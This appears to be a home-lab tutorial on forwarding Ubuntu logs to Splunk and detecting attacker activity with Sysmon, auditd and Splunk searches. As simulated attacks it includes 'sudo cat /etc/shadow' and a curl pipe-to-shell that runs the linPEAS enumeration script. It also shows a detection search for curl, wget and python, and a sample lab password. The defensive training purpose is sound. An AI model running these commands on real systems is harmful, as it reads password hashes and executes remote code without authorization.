# Ubuntu Desktop
Prepare a Ubuntu Deskop system (I spun up another VM running Ubuntu Desktop 24.04 LTS), as we practice configuring things and then work on some common use cases.

We will be using the Splunk "agent" called the Universal Forwarder (UF)
- harvests local logs and forward them to the Splunk indexer running on the server
- configure UF to pick up more logs so we can practice looking for cyber attacks

NOTE You will need your splunk.com account again to download Splunk plugins and the UF installer

## Configuring Splunk Server
### Install the Splunk Add-On for Unix and Linux
1. Log in to Splunk web UI
2. Go to the home screen
3. Left-hand sidebar, click **Find more apps**
4. Search for "Splunk Add-on for Unix and Linux"
5. Click **Install**
6. Enter your <ins>splunk.com</ins> username and password and click **Agree and Install**
7. Restart Splunk
    - **Settings** > **Server Controls** > **Restart Splunk**
    - or command line `sudo /opt/splunk/bin/splunk restart`

## Configure Ubuntu Deskop
Set up a Ubuntu Desktop 24.04 LTS test machine

Be default the UFW firewall is disabled/inactive. If you enabled it, you will need to allow TCP/9997.
- `sudo ufw allow 9997/tcp`
- `sudo ufw status`
     
### Install UF for Unix
1. Download the .deb file
    - https://splunk.com/en_us/download/universal-forwarder.html
    - You need to log in to splunk.com
    - Linux tab > 64-bit ( 6.x+ kernel, etc.) **.deb** > Download Now
        - Or copy the wget link and paste into a command line
2. Install the package named similar to `splunkforwarder-10.0.2-xxxxxx-linux-amd64.deb`
    - `sudo dpkg -i splunkforwarder-xxxx.deb`
    - `sudo /opt/splunkforwarder/bin/splunk enable boot-start`
    - `sudo /opt/splunkforwarder/bin/splunk start --accept-license`
        - Create `admin`/`Splunklab123!` credential, used later for UF changes
3. Connect Splunk indexer
    - `sudo /opt/splunkforwarder/bin/splunk add forward-server <YOUR_SPLUNK_IP>:9997`
        - enter the `admin`/`Splunklab123!` credentials when prompted
    - `sudo /opt/splunkforwarder/bin/splunk list forward-server`
4. Configure what logs to collect
    - Start with authentication logs and system logs
        - `sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log`
        - `sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/syslog`
5. Confirming logs arrive
    - Create test logs on the Ubuntu desktop:
      - `logger hello splunk`
      - `sudo echo "hello splunk"`
    - Log in to the Splunk Web UI
    - `| metadata type=hosts`
      - If your Ubuntu host name shows up, it is working!
    - `index=_internal host=<ubuntu-hostname>` (usually all lowercase in Splunk)
    - `index=main (sourcetype="syslog" OR sourcetype="auth")`
    - `index=main sourcetype="auth"`
~~~
index=main host="ubuntu-desktop-lan" sourcetype="auth"
| table _time, source, _raw
| sort - _time
~~~

### Test "Privilege Escalation" Scenario
On Ubuntu, `sudo` is the key the kingdom. Any user will use `sudo` for updates, but an attacker will use it to disable security or steal data.

In this example, an attacker is trying to dump the password hashes:
- `sudo cat /etc/shadow`
Splunk search for sudo activity
- `index=main host="ubuntu-desktop-lan" source="/var/log/auth.log" "sudo" "COMMAND="`
~~~
index=main sourcetype="auth" "sudo" "COMMAND="
| rex field=_raw "sudo:\s+(?<user>\S+) : TTY"
| rex field=_raw "COMMAND=(?<command>.*)"
| where isnotnull(command)
| table _time, user, command
~~~


### Test "Living Off the Land" Scenario
On Ubuntu, attackers will use common "dangerous" tools like `curl`, `wget`, `python`, or `netcat`/`nc`. On Linux desktop, `curl` isn't installed by default, so add it.
- `sudo apt install -y curl`

We are going to simulate downloading the second state malicious payload by running the [PEASS-ng](https://github.com/peass-ng/PEASS-ng/) toolkit.
- `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`

NOTE that no files are created, the script/tool is piped directly to a shell.

NOTE Read the output best you can to understand what kind of information this gives the attack to planned their next steam and escalate their privileges.

Detecting use of "dangerous" tools and "pipe-to-shell" in Splunk
- Linux doesn't log shell commands. The shell is privaite, and the commands only get written to ~/.bash_history when the logs out. The standard logs never see them.
  - Note only the installation of curl is logged: `index=main "curl"`
- **Auditd** is the naive Linux way to track this
- **Sysmon** is also available for Linux (we used this in the Windows Labs)

#### Sysmon for Linux
1.  Add the Microsoft prod repo
    - `wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb`
    - `sudo dpkg -i packages-microsoft-prod.deb`
    - `sudo apt update`
2. Install Sysmon for Linux
    - `sudo apt install sysmonforlinux -y`
3. Create file [sysmon-config.xml](sysmon-config.xml)
4. Apply: `sudo sysmon -accepteula -i sysmon-config.xml`
5. Run the command
6. Search Splunk
~~~
index=main "Linux-Sysmon" EventID=1
| rex field=_raw "<CommandLine>(?<full_cmd>[^<]+)"
| table _time, host, full_cmd
~~~

#### Auditd
Auditd was designed for 1990's compliant and in testing was not suited for threat detection.
- `sudo apt install auditd -y`
- `sudo sed -i 's/log_format = ENRICHED/log_format = RAW/g' /etc/audit/auditd.conf`
- `echo "-a exit,always -F arch=b64 -S execve -k command_monitor" | sudo tee -a /etc/audit/rules.d/audit.rules`
- `sudo augenrules --load`
- `sudo systemctl restart auditd`
- `sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/audit/audit.log`

The Result: Now, every time curl or bash runs, it generates a log in /var/log/audit/audit.log. Unfortunately you can't see the rest of the command arguments.

~~~
index=main "command_monitor"
| rex field=_raw "exe=(?P<hex_exe>\S+)"
| eval clean_exe = if(match(hex_exe, "^[0-9a-fA-F\"]+$"), urldecode(replace(replace(hex_exe,"\"",""), "([0-9a-fA-F]{2})", "%\1")), hex_exe)
| table _time, clean_exe, _raw
~~~

~~~
index=main "command_monitor"
| rex field=_raw "exe=(?P<hex_exe>\S+)"
| eval clean_exe = if(match(hex_exe, "^[0-9a-fA-F\"]+$"), urldecode(replace(replace(hex_exe,"\"",""), "([0-9a-fA-F]{2})", "%\1")), hex_exe)
| search clean_exe="*python*" OR clean_exe="*curl*" OR clean_exe="*wget*"
| table _time, clean_exe, _raw
~~~


### Test "USB" Scenario
usb insertion

